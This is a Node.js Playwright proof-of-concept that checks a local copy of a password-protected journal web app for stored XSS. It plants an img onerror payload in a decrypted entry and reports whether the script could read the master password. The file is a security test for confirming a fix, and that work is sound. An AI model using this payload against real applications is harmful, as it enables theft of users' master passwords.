// PoC #1 - stored XSS -> master-password theft.
// Run against a checkout of the code you want to test (needs: npm i playwright && npx playwright install chromium):
//     node poc/poc_xss_key_theft.cjs <dir containing index.html>
// OLD code  -> prints "VULNERABLE" and the stolen master password.
// FIXED code -> prints "SAFE".
const path = require("path");
const { createStaticServer, listen } = require("../tests/static-server.cjs");
const { chromium } = require("playwright");
const root = path.resolve(process.argv[2] || ".");
const srv = createStaticServer(root);
(async () => {
  await listen(srv, 8124);
  const b = await chromium.launch(), ctx = await b.newContext({ serviceWorkers: "block" }), page = await ctx.newPage();
  await ctx.route("https://accounts.google.com/gsi/client", (r) => r.fulfill({ contentType: "text/javascript", body: "window.google={accounts:{oauth2:{initTokenClient:()=>({requestAccessToken(){}})}}};" }));
  await ctx.route("https://www.googleapis.com/**", (r) => r.fulfill({ status: 200, body: "{}" }));
  await page.goto("http://localhost:8124/"); await page.waitForTimeout(500);
  // Simulate "the vault just got unlocked with master password 'hunter2-demo'" and contains attacker-controlled text.
  // (How it gets there: you paste it, a shared/compromised Drive file, an old synced entry ... the app trusts decrypted data.)
  const payload = `<img src=x onerror="window.__pwned=1;window.__stolen=(typeof activeKey!=='undefined')?activeKey:'(not reachable)'">`;
  await page.evaluate((p) => {
    try { activeKey = "hunter2-demo"; } catch (e) {}
    sanctuaryData = { journal: [], codex: [], lists: [], thoughts: [{ id: "x", type: "personal", text: p, timestamp: new Date().toISOString() }], deleted: {} };
    document.getElementById("btn-new-entry") && 0;
    window.dispatchEvent(new Event("cloudDataLoaded"));
  }, payload);
  await page.waitForTimeout(600);
  const r = await page.evaluate(() => ({ pwned: window.__pwned, stolen: window.__stolen }));
  console.log(r.pwned ? `VULNERABLE: script ran, stole master password = ${JSON.stringify(r.stolen)}` : "SAFE: payload did not execute");
  await b.close(); srv.close();
})();
